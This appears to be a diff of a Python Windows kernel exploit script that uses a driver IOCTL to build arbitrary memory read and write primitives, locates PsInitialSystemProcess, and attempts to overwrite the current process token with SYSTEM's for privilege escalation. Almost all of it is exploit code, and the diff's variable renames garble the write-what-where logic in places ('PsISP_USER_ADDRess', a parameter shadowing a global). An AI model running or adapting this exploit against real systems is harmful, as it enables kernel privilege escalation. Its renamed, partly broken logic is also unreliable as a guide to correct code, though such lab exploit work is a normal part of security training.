@@ -32,14 +32,14 @@ PAGE_EXECUTE_READWRITE = 0x00000040
 PAGE_READWRITE = 0x00000004
 ThreadBasicInformation = 0
 
-################################################### SPECIAL ADDRESSES ######################################################
+################################################### ADDRESSES FOR MSDN ######################################################
 
 USER_ADDR = 0x000000001a000000
 WHAT_ADDR = 0x000000001a001000 # Arbitrary offset inside BASEADDRESS 
-ARBITRARY_WHAT_ADDR = 0x000000001a002000
+USER_MEM_PAGE_PTR = 0x000000001a003000 # Requires 16 byte offset in our defined user memory.
 CURRENT_PROCESS_HANDLE = 0xFFFFFFFFFFFFFFFF
 BASEADDRESS = c_ulonglong(USER_ADDR)
-ADDRESSSIZE = c_ulonglong(0x3000)
+ALLOCATED_USER_MEM_SZ = c_ulonglong(0x3000)
 
 ###################################################### DEFINITIONS ##########################################################
 
@@ -80,7 +80,7 @@ dwStatus = ntdll.NtAllocateVirtualMemory(
     CURRENT_PROCESS_HANDLE,
     byref(BASEADDRESS),
     0,
-    byref(ADDRESSSIZE),
+    byref(ALLOCATED_USER_MEM_SZ),
     MEM_COMMIT | MEM_RESERVE,
     PAGE_EXECUTE_READWRITE,
     )
@@ -165,12 +165,12 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
     # print("[+] %s Userland Base Address : 0x%X" % (kernel_base, kernel_handle))
 
-    PsISP_user_address = kernel32.GetProcAddress(kernel_handle, 'PsInitialSystemProcess')
-    print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' % PsISP_user_address
+    PsISP_USER_ADDRess = kernel32.GetProcAddress(kernel_handle, 'PsInitialSystemProcess')
+    print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' % PsISP_USER_ADDRess
 
     # Calculate PsInitialSystemProcess offset in kernel land
 
-    system_process_base_pointer = kernel_base + PsISP_user_address - kernel_handle
+    system_process_base_pointer = kernel_base + PsISP_USER_ADDRess - kernel_handle
     print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % system_process_base_pointer
 
     PsISP_kernel_address = c_ulonglong()
@@ -181,7 +181,7 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
 ################################################### WRITE ###########################################################
 
-def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
+def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x4242424242424242):
     
     # Write the what value to WHAT_ADDR
     data = struct.pack("<Q", what)
@@ -191,8 +191,8 @@ def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
         print("Something went wrong while writing to memory","e")
         sys.exit()
 
-    # Pack the address of the what value and the where address
-    data = struct.pack("<Q", WHAT_ADDR) + struct.pack("<Q", where)
+    # Pack the address of the what value and the USER_MEM_PAGE_PTR address
+    data = struct.pack("<Q", WHAT_ADDR) + struct.pack("<Q", USER_MEM_PAGE_PTR)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
     if dwStatus == 0:
         print("Something went wrong while writing to memory in the packing section","e")
@@ -201,7 +201,7 @@ def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
 
     #IOCTL
     IoControlCode = 0x0022200B
-    #Where
+    #USER_MEM_PAGE_PTR
     InputBuffer = c_void_p(USER_ADDR)
     # I THINK this should work? 
     InputBufferLength = 0x10 # can't take length of a void pointer len(InputBuffer) 
@@ -212,16 +212,16 @@ def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-    print "Value before DeviceIoControl: %08x" % cast(ARBITRARY_WHAT_ADDR, POINTER(c_ulonglong))[0]
+    print "Value before DeviceIoControl: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
     print "Our memory target is: " + str(hex(WHAT_ADDR))
-    print "I wrote this to our memory target: %08x" % cast(ARBITRARY_WHAT_ADDR, POINTER(c_ulonglong))[0]
+    print "I wrote this to our memory target: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
 ################################################### READ ###########################################################
                           # What is it you want to read? #We are writing it back to userland memory.
 
-def readPrimitive(driver, WHAT_ADDR, where):
+def readPrimitive(driver, WHAT_ADDR, USER_MEM_PAGE_PTR):
 
     # We've created a block of memory at the top of userland via dwStatus
 
@@ -236,9 +236,9 @@ def readPrimitive(driver, WHAT_ADDR, where):
                                                             # THIS SHOULD BE USER_ADDR, OUR USER MEMORY PAGE
     
     #print "WHAT: ", type(WHAT_ADDR), hex(WHAT_ADDR)
-    #print "WHERE: ", type(where), hex(where)
+    #print "USER_MEM_PAGE_PTR: ", type(USER_MEM_PAGE_PTR), hex(USER_MEM_PAGE_PTR)
 
-    data = struct.pack('<QQ', WHAT_ADDR, where)
+    data = struct.pack('<QQ', WHAT_ADDR, USER_MEM_PAGE_PTR)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE,
             USER_ADDR, data, len(data), byref(written))
 
@@ -392,13 +392,13 @@ def executeOverwrite():
             #print "This is what in string format: " + whatStr
             #what = int((whatStr), 0) #figure out the base for me - throws a fit if its base 10
             what = process_struct_ptr #figure out the base for me - throws a fit if its base 10
-            writeQWORD(driver, what, ARBITRARY_WHAT_ADDR)
+            writeQWORD(driver, what, USER_MEM_PAGE_PTR)
             # Write the system_token over our current_token for SYSTEM privileges.
             print "MAIN Attempting system to current token overwrite!"
 
             #success = writePrimitive(driver, system_token, current_token, system_token)
 
-        print "MAIN Success!"
+        #print "MAIN Success!"
 ############################################ RUN ################################################
 
 executeOverwrite()
